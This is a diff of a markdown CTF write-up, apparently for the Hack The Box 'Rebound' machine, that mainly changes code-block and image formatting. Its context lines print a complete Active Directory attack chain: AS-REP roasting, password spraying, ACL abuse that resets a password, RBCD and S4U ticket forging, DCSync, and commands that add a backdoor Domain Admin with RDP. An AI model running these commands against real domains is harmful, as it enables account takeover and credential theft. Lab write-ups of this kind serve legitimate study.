@@ -208,12 +208,10 @@ SMB         rebound.htb     445    DC01             7687: rebound\delegator$ (Si
 
 Lots of users and groups, but most importantly we have some users. With a username list, we can try AS-REP Roasting without credentials.
 
-{% code overflow="wrap" %}
 ```
 $ impacket-GetNPUsers -request -usersfile users.txt -dc-ip dc01.rebound.htb rebound.htb/
 $krb5asrep$23$jjones@REBOUND.HTB:f5cb26a6a085535088c973a3cd42eaa0$1fff50bbcd21154e94b1b193ef38d5b1a552ca9b2ca2b601c1674db240ae8f8500181cf6112f43ce2b2ced4e9f62d7a6818ddd06e30e6d76ad3ffde8808a0fb8fafbb1222b2fe403e9e3f4ee5c1c04eefae8fadd17a950e7a7aec6ca4f77d902396462183d963f6aab8a269a31f5c25dbffc9e48a265a5f973e4da1e42824c3670ae65a44cd3cac57e0ce500ac3d85effa45dc1c8ae88b3189f81fbd75ac94ccadc62b2f8acca9bce3917c3e9f18f9188707e18c717cdb20f0c3add2ca7b46013d42a2194a5fd9c60eac695c4f335fece76078bd34f4bcdd29a7414c4913154d52da57343ce710427a14
 ```
-{% endcode %}
 
 However, this hash cannot be cracked for some reason.
 
@@ -253,25 +251,22 @@ Session completed.
 
 Using these credentials, we can use `bloodhound-python` to enumerate the entire domain. Running it the first time reveals that `gmsa.rebound.htb` is another domain we need to add to the `hosts` file. Afterwards, we can run it to collect information about the domain:
 
-{% code overflow="wrap" %}
 ```
 $ bloodhound-python -u ldap_monitor -p <REDACTED> -d rebound.htb -ns 10.129.148.205 -c all
 ```
-{% endcode %}
 
 Afterwards, we can upload the information to Bloodhound. From it, `winrm_svc` seems to be the next user we have to compromise:
 
-<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(21).png>)
 
 The `ServiceMgmt` group was also found to have some interesting privileges:
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(22).png>)
 
 Other than that, Bloodhound provided nothing of use since we aren't part of the `ServiceMgmt` group. I spent quite a bit of time thinking about how the user we compromised was called `ldap_monitor`, and what we could do with LDAP.
 
 Attempting to use `ldapdomaindump` shows that we need 'stronger auth':
 
-{% code overflow="wrap" %}
 ```
 $ ldapdomaindump 10.129.148.205 -u 'rebound\ldap_monitor' -p <TRUNCATED> --no-json --no-grep
 [*] Connecting to host...
@@ -279,7 +274,6 @@ $ ldapdomaindump 10.129.148.205 -u 'rebound\ldap_monitor' -p <TRUNCATED> --no-js
 [!] Could not bind with specified credentials
 [!] {'result': 8, 'description': 'strongerAuthRequired', 'dn': '', 'message': '00002028: LdapErr: DSID-0C090259, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
 ```
-{% endcode %}
 
 Since we still had a username list, I thought to try password spraying with the password I found, and I found another user with the same password:
 
@@ -367,16 +361,14 @@ $ bloodyAD.py -u oorend -p <PASS> -d rebound.htb --host 10.129.68.225 add groupM
 
 From here, what we can do is attempt to give `oorend` `GenericAll` privilege over the OU for Service Users, and from there set the password of the `winrm_svc` user to something else:
 
-{% code overflow="wrap" %}
 ```
 $ python bloodyAD.py -d rebound.htb -u oorend -p <PASS> --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
 $ python bloodyAD.py -d rebound.htb -u oorend -p <PASS> --host dc01.rebound.htb set password winrm_svc 'Pa$$w0rd'
 ```
-{% endcode %}
 
 Afterwards, we can `evil-winrm` in as the user:
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(23).png>)
 
 ## Privilege Escalation
 
@@ -398,7 +390,7 @@ userprincipalname name      msds-allowedtodelegateto
 
 This is probably the last step to `root`, so we'll keep this in mind. I also ran a `SharpHound.exe` on the machine itself and updated my Bloodhound database. When taking a look at all the parts of `tbrady` noticed this:
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(24).png>)
 
 The user has a session on the DC, and this might be exploitable as we could potentially steal credentials. There weren't any other leads I found, so I went along with this.
 
@@ -423,7 +415,7 @@ Afterwards, simply run the binary on the machine:
 
 This would give us the hash of the `tbrady` user:
 
-<figure><img src="../../.gitbook/assets/image (4212).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4212).png>)
 
 `john` can crack this hash to give the password of `tbrady`. Now that we have the password of `tbrady`, we can abuse the `ReadGMSAPassword` privileges given. Using `bloodyAD.py`, we can easily do this:
 
@@ -496,21 +488,17 @@ The part I was stuck on was the RBCD part, since I had no idea why we had to use
 
 First, let's get the ticket needed:
 
-{% code overflow="wrap" %}
 ```
 $ sudo ntpdate -S dc01.rebound.htb
 $ impacket-getTGT 'rebound.htb/delegator$@rebound.htb' -hashes <NTLM>
 $ export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache
 ```
-{% endcode %}
 
 Afterwards, we can use `impacket-rbcd` for this:
 
-{% code overflow="wrap" %}
 ```
 $ impacket-rbcd -k -no-pass 'rebound.htb/delegator$@rebound.htb' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor
 ```
-{% endcode %}
 
 Then, we can request a ticket as `ldap_monitor` using the password we have earlier (same as `oorend`).
 
@@ -521,21 +509,17 @@ $ export KRB5CCNAME=ldap_minitor.ccache
 
 Now we need to request a Service Ticket as the `delegator$` user and impersonate `dc01$`. Based on Bloodhound, this user has a SPN of `browser/dc01.rebound.htb`:
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(14).png>)
 
-{% code overflow="wrap" %}
 ```
 $ impacket-getST -spn 'browser/dc01.rebound.htb' -impersonate 'dc01' 'rebound.htb/ldap_monitor' -k -no-pass
 ```
-{% endcode %}
 
 Then, use this ST to request for the TGT for `dc01$`.
 
-{% code overflow="wrap" %}
 ```
 $ impacket-getST -spn 'http/dc01.rebound.htb' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' 'rebound.htb/delegator$' -k -no-pass
 ```
-{% endcode %}
 
 Afterwards, we can do a DCSync since we have the domain admin ticket to grab the NTLM hash of the administrator and `evil-winrm` in:
 
@@ -543,7 +527,7 @@ Afterwards, we can do a DCSync since we have the domain admin ticket to grab the
 $ impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm 
 ```
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(15).png>)
 
 Here are some of the resources linked in the writeup sent to me, good reads overall:
 
@@ -562,7 +546,6 @@ There were 2 things I was puzzled about:
 
 I downloaded `PowerView.ps1` to the machine and enumerated it further as the domain admin. There was probably something that the `oorend` user had that could not be found using Bloodhound. When enumerating the ACLs for the `ServiceMgmt` group, I came across this:
 
-{% code overflow="wrap" %}
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb"}
 
@@ -586,7 +569,6 @@ AceQualifier          : AccessAllowed
 *Evil-WinRM* PS C:\Users\Administrator\Documents> ConvertFrom-SID S-1-5-21-4078382237-1492182817-2568127209-7682
 rebound\oorend
 ```
-{% endcode %}
 
 So all along, the `oorend` user had `Self` privileges over this group, which explains why we could add our user into the group via `bloodyAD.py`.
 
@@ -598,7 +580,6 @@ The weird part was that Bloodhound failed to pick this up at all. I ran `SharpHo
 
 To enumerate this, I just enabled RDP and created another domain admin user:
 
-{% code overflow="wrap" %}
 ```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
@@ -607,7 +588,6 @@ net localgroup "Remote Desktop Users" rdpuser /add
 net localgroup "Administrators" rdpuser /add
 net group "Domain Admins" rdpuser /add /domain
 ```
-{% endcode %}
 
 Afterwards, I used `xfreerdp` to get in:
 
@@ -617,11 +597,11 @@ $ xfreerdp /u:rdpuser /p:Password@123 /v:10.129.197.120
 
 When viewing the delegation settings, I noticed that `ldap_monitor` had the Delegation tab:
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(16).png>)
 
 The `oorend` user did not have this tab:
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(17).png>)
 
 For some reason, `ldap_monitor` was technically allowed to delegate and the `oorend` user was not. I found few resources that explained this well, but basically it seems that `ldap_monitor` does have an SPN:
 
@@ -629,6 +609,6 @@ For some reason, `ldap_monitor` was technically allowed to delegate and the `oor
 
 {% embed url="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts" %}
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(18).png>)
 
 This means that delegation is 'possible' for `ldap_monitor` because it has an SPN set, whereas `oorend` does not and cannot even process the Kerberos ticket. No wonder I was stuck.
